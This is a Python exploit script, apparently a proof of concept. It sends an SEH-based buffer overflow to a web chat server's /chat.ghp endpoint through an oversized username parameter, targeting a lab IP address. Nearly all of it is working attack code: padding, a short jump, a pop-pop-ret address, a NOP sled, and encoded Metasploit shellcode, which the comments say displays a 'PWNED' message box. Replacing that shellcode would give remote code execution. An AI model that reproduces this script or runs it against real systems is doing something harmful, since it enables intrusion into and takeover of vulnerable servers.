#! /usr/bin/python

import socket
import sys

buffer="A"*216
ppr="\x13\x08\x01\x10" 		# 0x100104BC SSLEAY32.dll pop edi, pop esi, retn
jmp="\xeb\x06\x90\x90"
nop="\x90"*16

# msfpayload windows/messagebox title="PWNED" text="Pwned by D4v3" R | msfencode -b "\x00\x0a\x0d\x20" -e x86/alpha_mixed -t c
# [*] x86/alpha_mixed succeeded with size 582 (iteration=1)

shellcode = ("\x89\xe1\xdb\xc6\xd9\x71\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x58\x59\x7a\x4b\x6f\x6b\x4e\x39\x70\x74\x47\x54\x49\x64\x55"
"\x61\x7a\x72\x6d\x62\x71\x67\x30\x31\x6a\x69\x72\x44\x6c\x4b"
"\x32\x51\x74\x70\x6e\x6b\x61\x66\x74\x4c\x6c\x4b\x63\x46\x47"
"\x6c\x4c\x4b\x57\x36\x46\x68\x4c\x4b\x51\x6e\x71\x30\x6c\x4b"
"\x36\x56\x35\x68\x52\x6f\x57\x68\x50\x75\x69\x63\x72\x79\x65"
"\x51\x4a\x71\x69\x6f\x4d\x31\x65\x30\x6c\x4b\x32\x4c\x34\x64"
"\x47\x54\x4e\x6b\x62\x65\x37\x4c\x6e\x6b\x32\x74\x77\x58\x64"
"\x38\x35\x51\x6a\x4a\x4c\x4b\x73\x7a\x74\x58\x4e\x6b\x32\x7a"
"\x31\x30\x66\x61\x7a\x4b\x6d\x33\x74\x74\x30\x49\x6e\x6b\x57"
"\x44\x4c\x4b\x53\x31\x5a\x4e\x30\x31\x6b\x4f\x44\x71\x6b\x70"
"\x69\x6c\x4c\x6c\x6e\x64\x6b\x70\x62\x54\x63\x37\x59\x51\x78"
"\x4f\x76\x6d\x56\x61\x78\x47\x6a\x4b\x49\x64\x57\x4b\x43\x4c"
"\x56\x44\x76\x48\x42\x55\x78\x61\x4e\x6b\x30\x5a\x46\x44\x65"
"\x51\x5a\x4b\x51\x76\x4e\x6b\x36\x6c\x50\x4b\x6c\x4b\x62\x7a"
"\x47\x6c\x43\x31\x78\x6b\x4c\x4b\x77\x74\x4e\x6b\x53\x31\x6d"
"\x38\x6f\x79\x50\x44\x47\x54\x37\x6c\x55\x31\x4a\x63\x4c\x72"
"\x57\x78\x71\x39\x5a\x74\x4e\x69\x79\x75\x6c\x49\x4b\x72\x50"
"\x68\x4c\x4e\x30\x4e\x74\x4e\x58\x6c\x30\x52\x68\x68\x6f\x6f"
"\x6b\x4f\x4b\x4f\x79\x6f\x4b\x39\x53\x75\x55\x54\x6f\x4b\x31"
"\x6e\x6a\x78\x4b\x52\x51\x63\x4d\x57\x77\x6c\x45\x74\x70\x52"
"\x79\x78\x4c\x4e\x39\x6f\x49\x6f\x39\x6f\x6b\x39\x52\x65\x45"
"\x58\x31\x78\x32\x4c\x72\x4c\x45\x70\x47\x31\x63\x58\x47\x43"
"\x74\x72\x36\x4e\x72\x44\x32\x48\x34\x35\x34\x33\x32\x45\x44"
"\x32\x6b\x38\x73\x6c\x64\x64\x54\x4a\x4c\x49\x4a\x46\x31\x46"
"\x69\x6f\x30\x55\x47\x74\x6d\x59\x79\x52\x32\x70\x6f\x4b\x4c"
"\x68\x4f\x52\x42\x6d\x6f\x4c\x6e\x67\x65\x4c\x65\x74\x72\x72"
"\x6d\x38\x55\x31\x39\x6f\x49\x6f\x79\x6f\x53\x58\x70\x44\x43"
"\x68\x57\x50\x47\x50\x35\x38\x56\x30\x51\x47\x62\x6e\x37\x35"
"\x45\x61\x49\x4b\x6e\x68\x43\x6c\x61\x34\x43\x35\x4f\x79\x59"
"\x73\x73\x58\x55\x63\x56\x38\x71\x30\x51\x30\x61\x78\x77\x50"
"\x37\x34\x64\x74\x42\x56\x31\x78\x52\x44\x57\x50\x61\x72\x51"
"\x69\x61\x78\x56\x30\x30\x77\x52\x4e\x70\x65\x54\x71\x4f\x39"
"\x4f\x78\x30\x4c\x46\x44\x54\x4d\x4f\x79\x6d\x31\x50\x31\x5a"
"\x72\x33\x62\x31\x43\x73\x61\x30\x52\x79\x6f\x5a\x70\x64\x71"
"\x6b\x70\x70\x50\x4b\x4f\x51\x45\x46\x68\x41\x41")

payload=buffer+jmp+ppr+nop+shellcode

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.56.102',80))
url='GET /chat.ghp?username=' + payload +'&password=test&room=1&ex=2 HTTP/1.1\r\n\r\n'
s.send(url)
s.close()
